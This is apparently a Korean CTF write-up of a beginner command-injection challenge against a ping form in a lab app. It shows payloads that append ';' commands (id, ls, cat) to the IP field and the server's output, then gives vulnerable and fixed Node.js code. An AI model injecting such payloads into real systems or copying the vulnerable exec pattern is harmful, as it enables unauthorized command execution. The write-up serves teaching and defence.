+++
title = "VulnABLE CTF [LUXORA] Write-up: Command Injection 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Command Injection", "Bronze", "OS Command", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Command Injection 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (CMDi)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/cmdi/bronze`
- **목표**: 입력값 검증이 없는 Ping 진단 페이지에 리눅스 쉘의 명령어 구분자를 주입하여, 서버 내부의 OS 명령어를 강제로 실행시키고 숨겨진 플래그를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 반응 분석 (Reconnaissance)

`/cmdi/bronze` 페이지는 네트워크 관리자가 서버의 상태를 확인하기 위해 만들어둔 것 같은 "Ping Test" 기능이 있습니다.
입력창에 목적지 IP 주소(예: `8.8.8.8`)를 입력하고 [Test] 버튼을 클릭해 봅니다.

**[정상 요청 및 응답]**
```http
POST /cmdi/bronze
Content-Type: application/x-www-form-urlencoded

ip=8.8.8.8
```

```text
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=14.2 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=117 time=13.8 ms
...
```

**[해커의 사고 과정]**
1. 이 결과 텍스트는 리눅스의 `ping` 명령어 출력물과 글자 하나 안 틀리고 똑같다.
2. 백엔드에서 내가 입력한 `ip` 파라미터를 그대로 받아서 `ping -c 4 [ip]` 형태의 문자열을 만든 뒤, `os.system()` 이나 `child_process.exec()` 같은 함수로 쉘에 통째로 던져버리는 것 같다.
3. 리눅스 쉘(Bash)의 특징 중 하나는 여러 명령어를 한 줄에 이어 쓸 수 있다는 점이다. 
4. 명령어 사이에 `;` (세미콜론)이나 `&&` 를 넣어서 내 마음대로 명령어를 추가해보자!

---

## 💥 2. 취약점 검증 (Vulnerability Identification)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Input: 8.8.8.8 ; id)--> [ Web Server ]
                                        |-- OS Command Execution
                                        |-- Runs: ping 8.8.8.8 ; id
                                        |-- Returns Output
```


리눅스 시스템 명령어인 `id` (현재 시스템을 구동 중인 사용자의 권한을 확인하는 명령어)를 주입해 봅니다.

### 페이로드 전송
```http
POST /cmdi/bronze
Content-Type: application/x-www-form-urlencoded

ip=8.8.8.8; id
```

### 서버의 응답
```text
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=14.2 ms
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**[해석 및 결론]**
대성공입니다. 앞의 `ping 8.8.8.8` 명령어가 정상적으로 끝난 뒤, 백엔드의 터미널이 세미콜론(`;`) 뒤에 있는 `id` 명령어를 이어받아 실행했습니다. 그 결과 `uid=33(www-data)` 라는 시스템 정보가 출력되었습니다. 이는 서버의 터미널(Shell)을 내가 완전히 장악했다는 뜻입니다!

---

## 🚀 3. 플래그 탐색 및 획득 (Exploitation)

이제 서버 내부를 마음대로 돌아다니며 플래그 파일을 찾아야 합니다. 리눅스의 기본 명령어인 `ls` (디렉터리 목록 보기)와 `cat` (파일 내용 읽기)을 사용합니다.

### Step 1: 디렉터리 탐색
```http
POST /cmdi/bronze
ip=8.8.8.8; ls -la
```

**응답 결과:**
```text
(핑 결과 생략...)
total 40
drwxr-xr-x 1 www-data www-data 4096 Oct 10 12:00 .
drwxr-xr-x 1 root     root     4096 Oct 10 11:50 ..
-rw-r--r-- 1 www-data www-data 1024 Oct 10 12:00 index.js
-rw-r--r-- 1 www-data www-data   45 Oct 10 12:00 flag_bronze.txt
...
```

현재 디렉터리에 `flag_bronze.txt` 라는 파일이 존재하는 것을 확인했습니다.

### Step 2: 플래그 파일 읽기
```http
POST /cmdi/bronze
ip=8.8.8.8; cat flag_bronze.txt
```

**응답 결과:**
```text
(핑 결과 생략...)
FLAG{CMDI_🥉_BASIC_EXEC_D4E5F6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

입력값에 대한 어떠한 검증도 없는 상태에서, 위험한 쉘 실행 함수를 사용한 애플리케이션의 취약점을 파고들어 단 2번의 요청만으로 서버의 운영체제 제어권을 획득했습니다.

**🔥 획득한 플래그:**
`FLAG{CMDI_🥉_BASIC_EXEC_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
개발자가 시스템 명령어를 호출할 때, 사용자 입력을 "문자열 형태"로 통째로 쉘에 전달했기 때문에 발생한 참사입니다.

* **취약한 코드 예시 (Node.js)**
```javascript
const { exec } = require('child_process');
// 사용자의 입력값이 그대로 쉘 명령어 문자열에 결합됨
exec('ping -c 4 ' + req.body.ip, (err, stdout, stderr) => { ... });
```

* **안전한 패치 코드 1: 파라미터화된 실행 함수 사용**
명령어(Executable)와 인자(Arguments)를 엄격히 분리하여 쉘 인터프리터가 개입하지 못하게 하는 함수를 사용해야 합니다.
```javascript
const { execFile } = require('child_process');
// 인자가 배열로 들어가므로 세미콜론이 들어와도 그냥 IP 주소의 일부(에러)로 취급됨
execFile('ping', ['-c', '4', req.body.ip], (err, stdout, stderr) => { ... });
```

* **안전한 패치 코드 2: 엄격한 입력값 검증 (화이트리스트)**
입력값이 정말로 IPv4 주소 형태인지 정규표현식으로 검사한 뒤에만 명령어를 실행하도록 로직을 추가해야 합니다.
```javascript
const ipRegex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(...생략...)$/;
if (!ipRegex.test(req.body.ip)) {
    return res.status(400).send("Invalid IP Address");
}